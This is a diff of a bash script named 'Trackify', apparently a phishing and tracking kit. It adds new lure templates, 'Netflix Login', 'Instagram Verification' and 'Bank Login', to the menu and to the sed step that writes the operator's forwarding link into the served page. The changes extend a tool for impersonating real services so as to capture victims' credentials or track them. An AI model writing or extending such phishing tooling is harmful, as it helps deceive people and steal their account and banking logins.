@@ -1,5 +1,5 @@
 #!/bin/bash
-# Trackify v1.5
+# Trackify v1.0
 # Powered by TechChip
 # Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
 
@@ -525,6 +525,12 @@ elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' Gmeet.html > index2.html
 elif [[ $option_tem -eq 3 ]]; then
 sed 's+forwarding_link+'$link'+g' Sensitive.html > index2.html
+elif [[ $option_tem -eq 4 ]]; then
+sed 's+forwarding_link+'$link'+g' Netflix.html > index2.html
+elif [[ $option_tem -eq 5 ]]; then
+sed 's+forwarding_link+'$link'+g' Instagram.html > index2.html
+elif [[ $option_tem -eq 6 ]]; then
+sed 's+forwarding_link+'$link'+g' Bank.html > index2.html
 fi
 }
 
@@ -726,6 +732,9 @@ printf "\n-----Choose a template----\n"
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m YouTube Live\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Google Meet\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Sensitive Video (Age Verification)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Netflix Login\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Instagram Verification\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Bank Login\e[0m\n"
 default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
@@ -734,6 +743,12 @@ read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: 
 elif [[ $option_tem -eq 2 ]]; then
 printf ""
 elif [[ $option_tem -eq 3 ]]; then
+printf ""
+elif [[ $option_tem -eq 4 ]]; then
+printf ""
+elif [[ $option_tem -eq 5 ]]; then
+printf ""
+elif [[ $option_tem -eq 6 ]]; then
 printf ""
 else
 printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
